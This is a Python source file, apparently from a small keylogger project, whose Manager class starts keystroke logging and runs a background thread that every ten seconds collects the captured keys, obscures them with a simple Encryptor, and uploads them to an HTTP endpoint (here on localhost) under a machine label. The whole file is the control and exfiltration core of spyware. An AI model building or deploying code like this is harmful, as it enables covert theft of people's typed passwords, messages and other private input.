from KeyLoggerService import *
import file_writer
from file_writer import NetworkWriter
from Encryption import *
import time
import threading

class Manager:

    def __init__(self):
        self.keylogger = KeyLoggerService()
        self.send= NetworkWriter("http://127.0.0.1:5000/api/upload")
        self.encryptor = Encryptor(5)

    def start(self):
        self.keylogger.start_logging()
        threading.Thread(target=self.send_data, daemon=True).start()

    def stop(self):
        self.keylogger.stop_logging()

    def send_data(self):
        while True:
            time.sleep(10)
            try:
                data = self.keylogger.get_logged_keys()

                encrypted_data = self.encryptor.encrypt(data)
                self.send.send_data(encrypted_data, "my computer2")
            except:
                print('some error occurred, please check your program')